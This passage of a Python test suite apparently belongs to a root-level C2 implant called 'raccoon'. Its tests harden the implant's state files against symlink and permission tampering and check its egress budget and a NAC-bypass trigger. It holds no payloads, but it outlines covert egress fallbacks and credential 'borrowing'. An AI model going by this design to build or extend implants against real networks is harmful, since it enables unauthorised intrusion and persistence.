            "beacon_interval_seconds": 300, "jitter_percent": 0,
            "encryption_key": base64.b64encode(_KEY).decode(),
            "proxy": {"mode": "auto"}, "https": {"enabled": False},
            "dns": {"enabled": False}, "smb": {"enabled": False},
            "quic": {"enabled": False}}})
        self.addCleanup(setattr, beacon, "_running", False)
        self.assertFalse(beacon._way_out_enabled)
        self.assertIsNone(beacon._way_out_document())

    def test_the_shipped_block_is_disabled_and_reads_without_a_warning(self):
        import yaml
        config = yaml.safe_load(
            (REPO_ROOT / "configs" / "raccoon.yaml").read_text())
        policy = read_way_out_policy(config["c2"]["way_out"])
        self.assertEqual(self.logged.warnings, [])
        self.assertFalse(policy["enabled"])
        self.assertFalse(policy["model"]["enabled"])


class TestAHostileStateDirectory(WayOutCase):
    """The handoff's directory is a place another process can reach.

    The implant runs as root and the handoff is under `/opt/raccoon`, but
    "0600 in a 0700 directory" has to be true of a directory somebody
    *else* made as well -- an operator who pointed `state_dir` at
    `/var/tmp/raccoon`, or a local process that got there first. A review
    found three ways through: a pre-existing directory kept its mode, the
    trail followed a symlink planted at its name, and nothing
    authenticated the identity request -- so write access to the directory
    was write access to the one irreversible move.
    """

    def test_a_pre_existing_directory_is_tightened(self):
        loose = os.path.join(self.root, "loose")
        os.makedirs(loose, mode=0o777)
        os.chmod(loose, 0o777)
        handoff.write_private_json(os.path.join(loose, "x.json"),
                                   {"version": 1})
        self.assertEqual(os.stat(loose).st_mode & 0o777, 0o700,
                         "a directory somebody else made kept its mode, and "
                         "the 0600 files in it are reachable")

    def test_a_directory_that_is_a_symlink_is_refused(self):
        elsewhere = os.path.join(self.root, "elsewhere")
        os.makedirs(elsewhere)
        link = os.path.join(self.root, "link")
        os.symlink(elsewhere, link)
        with self.assertRaises(ValueError) as refusal:
            handoff.write_private_json(os.path.join(link, "x.json"),
                                       {"version": 1})
        # And the reason names it. "not a directory" is what an operator
        # gets from a check that merely happens to refuse a symlink, and
        # it sends them looking for the wrong thing.
        self.assertIn("symbolic link", str(refusal.exception))
        self.assertEqual(os.listdir(elsewhere), [])

    def test_a_trail_that_is_a_symlink_is_not_followed(self):
        # Against the beacon's writer, which is the only one there is:
        # the scout's `append_trail` is gone, and this property had to go
        # with it rather than be dropped. A link planted at this name
        # would have the root beacon appending the trail wherever it
        # pointed.
        target = os.path.join(self.root, "someone-elses-file")
        Path(target).write_text("original\n")
        os.symlink(target, handoff.trail_path(self.root))
        beacon = self.beacon()
        beacon._way_out_record_attempt({"verb": "gsocket"})
        self.assertEqual(Path(target).read_text(), "original\n")

    def test_the_beacon_does_not_write_through_a_symlink_either(self):
        target = os.path.join(self.root, "someone-elses-file")
        Path(target).write_text("original\n")
        os.symlink(target, handoff.state_path(self.root))
        beacon = self.beacon()
        beacon._stuck_cycles = 2
        beacon._way_out_publish_state()
        self.assertEqual(Path(target).read_text(), "original\n")

    def test_the_beacon_tightens_a_pre_existing_directory_too(self):
        # The scout's writer was hardened and the beacon's was not, and
        # two of the six files are the beacon's -- including rung 4's
        # request. The page tells the operator the mode is enforced "on
        # every write".
        loose = os.path.join(self.root, "loose")
        os.makedirs(loose, mode=0o777)
        os.chmod(loose, 0o777)
        beacon = self.beacon(way_out={"enabled": True, "state_dir": loose})
        beacon._stuck_cycles = 2
        beacon._way_out_publish_state()
        self.assertEqual(os.stat(loose).st_mode & 0o777, 0o700)
        self.assertIsNotNone(handoff.read_state(loose))

    def test_the_beacon_refuses_a_symlinked_directory(self):
        elsewhere = os.path.join(self.root, "elsewhere")
        os.makedirs(elsewhere)
        link = os.path.join(self.root, "link")
        os.symlink(elsewhere, link)
        beacon = self.beacon(way_out={"enabled": True, "state_dir": link})
        beacon._stuck_cycles = 2
        beacon._way_out_publish_state()
        self.assertEqual(os.listdir(elsewhere), [],
                         "the beacon wrote its state through a symlink")
        # And the reason names it. "not a directory" is what an operator
        # gets from a check that merely happens to refuse a symlink, and
        # it sends them looking for the wrong thing.
        self.assertTrue(
            any("symbolic link" in message
                for message in self.logged.warnings),
            "the refusal did not say why: %r" % (self.logged.warnings,))

    def test_a_window_that_survives_a_restart_keeps_what_it_has_spent(self):
        # The budget is "per stuck window", and the window is the file --
        # which outlives the process. `_egress_spent` started at 0 on
        # every `Restart=always`, so the bound refilled on each restart.
        beacon = self.beacon()
        beacon._stuck_cycles = 2
        beacon._way_out_publish_state()
        beacon._egress_spent = 2
        beacon._way_out_publish_state()
        self.assertEqual(handoff.read_state(self.root)["spent"], 2)

        restarted = self.beacon()
        restarted._stuck_cycles = 3
        restarted._way_out_publish_state()
        self.assertEqual(restarted._egress_spent, 2,
                         "a restart refilled the window's budget")

    def test_an_attempt_is_spent_on_the_disk_before_the_next_publish(self):
        # The sharper half of the same thing, and the gap the test above
        # left: `_way_out_publish_state` runs once per cycle and the
        # attempt is made after it, so a beacon killed between the attempt
        # and the next cycle left a file saying the attempt had never
        # happened -- and the restart adopted that. One restart per attempt
        # is an unbounded budget on a unit with `Restart=always`. So the
        # attempt's own record writes `spent` too.
        beacon = self.beacon(policy={
            "enabled": True, "budget": 3,
            "rules": [{"when": {"https": ["not_attempted"]},
                       "try": "rediscover"}]})
        beacon._exec_egress = lambda task: "recorded"
        beacon._stuck_cycles = 12
        beacon._way_out_publish_state()
        self.assertTrue(beacon._egress_act())
        self.assertEqual(handoff.read_state(self.root)["spent"], 1,
                         "the window's file does not know the attempt was "
                         "made until the next cycle publishes")

        restarted = self.beacon()
        restarted._stuck_cycles = 12
        restarted._way_out_publish_state()
        self.assertEqual(restarted._egress_spent, 1)

    def test_a_request_somebody_else_wrote_is_not_acted_on(self):
        # The one move that cannot be undone from the far side, so the
        # file that asks for it has to have been written by this implant.
        # Checked by **ownership and mode** and not by a shared secret:
        # the two processes are both root on the same device, there is no
        # key to distribute, and the attacker this answers is the
        # unprivileged one who got to the directory first. A root attacker
        # owns the device and no check here changes that.
        from software.scout.trigger import IdentityTrigger

        handoff.write_private_json(handoff.identity_path(self.root), {
            "version": handoff.STATE_VERSION, "requested": time.time(),
            "stuck_cycles": 99})
        os.chmod(handoff.identity_path(self.root), 0o666)
        self.assertIsNone(
            IdentityTrigger(self.root).pending(),
            "a group-writable request started the NAC bypass")

    def test_the_beacons_own_request_is_acted_on(self):
        from software.scout.trigger import IdentityTrigger

        beacon = self.beacon()
        self.publish()
        beacon._stuck_cycles = 24 * 12
        self.assertNotIn("[error]", beacon._exec_egress("identity"))
        self.assertIsNotNone(IdentityTrigger(self.root).pending())

    def test_a_request_in_a_loose_directory_is_not_acted_on(self):
        # The window the directory mode alone leaves: pre-create the
        # directory world-writable, drop the request in, and the first
        # handoff write tightens the directory with the forgery already
        # inside it.
        from software.scout.trigger import IdentityTrigger

        loose = os.path.join(self.root, "loose")
        os.makedirs(loose, mode=0o777)
        os.chmod(loose, 0o777)
        handoff.write_private_json(handoff.identity_path(loose), {
            "version": handoff.STATE_VERSION, "requested": time.time()})
        os.chmod(loose, 0o777)
        self.assertIsNone(IdentityTrigger(loose).pending())


# ── the scout's side of the files ──


class TestTheScoutsReaderAndWriter(WayOutCase):
    def test_a_document_is_written_whole_or_not_at_all(self):
        handoff.write_document(self.root, {"version": 1, "published": 1.0})
        self.assertEqual(sorted(os.listdir(self.root)),
                         [handoff.DOCUMENT_NAME])
        self.assertEqual(
            os.stat(handoff.document_path(self.root)).st_mode & 0o777, 0o600)

    def test_an_absent_or_unreadable_state_file_reads_as_none(self):
        self.assertIsNone(handoff.read_state(self.root))
        Path(handoff.state_path(self.root)).write_text("{not json")
        self.assertIsNone(handoff.read_state(self.root))

    def test_a_state_file_of_another_version_reads_as_none(self):
        # The two halves are upgraded by two different installs, so a
        # shape this reader does not know is treated as absent rather than
        # guessed at: a half-understood window is a decision made on a
        # misunderstanding.
        handoff.write_private_json(
            handoff.state_path(self.root),
            {"version": handoff.STATE_VERSION + 1, "stuck_cycles": 9})
        self.assertIsNone(handoff.read_state(self.root))
        handoff.write_private_json(
            handoff.state_path(self.root),
            {"version": handoff.STATE_VERSION, "stuck_cycles": 9})
        self.assertEqual(handoff.read_state(self.root)["stuck_cycles"], 9)

    def test_a_document_of_another_version_reads_as_none_for_the_scout_too(self):
        handoff.write_document(self.root,
                               {"version": handoff.DOCUMENT_VERSION + 1})
        self.assertIsNone(handoff.read_document(self.root))

    def test_the_trail_is_append_only_and_survives_the_state_file(self):
        # The beacon's writer, for the reason the symlink test above
        # gives: this module's own `append_trail` is gone, because the
        # scout lost a window's last attempts by copying them on its
        # publishing clock. Two attempts, two lines, in order, 0600.
        beacon = self.beacon()
        beacon._way_out_record_attempt({"verb": "gsocket"})
        beacon._way_out_record_attempt({"verb": "proxy"})
        lines = [json.loads(line) for line
                 in Path(handoff.trail_path(self.root)).read_text().splitlines()]
        self.assertEqual([entry["verb"] for entry in lines],
                         ["gsocket", "proxy"])
        self.assertEqual(
            os.stat(handoff.trail_path(self.root)).st_mode & 0o777, 0o600)

    def test_the_borrow_file_is_private(self):
        handoff.write_borrow(self.root, {"credentials": [], "portal": None})
        self.assertEqual(
            os.stat(handoff.borrow_path(self.root)).st_mode & 0o777, 0o600)


if __name__ == "__main__":
    unittest.main()
